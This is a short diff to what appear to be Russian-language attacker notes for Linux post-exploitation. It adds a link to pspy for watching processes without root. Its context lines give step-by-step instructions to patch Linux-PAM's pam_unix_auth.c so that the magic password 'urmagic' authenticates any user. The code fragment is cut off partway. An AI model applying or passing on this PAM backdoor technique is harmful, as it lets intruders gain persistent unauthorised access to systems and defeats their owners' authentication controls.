@@ -1,3 +1,6 @@
+Смотреть процессы без рута основываясь на proc дире в лине, класс
+https://github.com/DominicBreuker/pspy
+
 Бедкор
   Качай (http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz), иди в Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c и буквально на 4 строке
   (после retval)  дописывай такой код  (if (strcmp(p,"urmagic") == 0) {
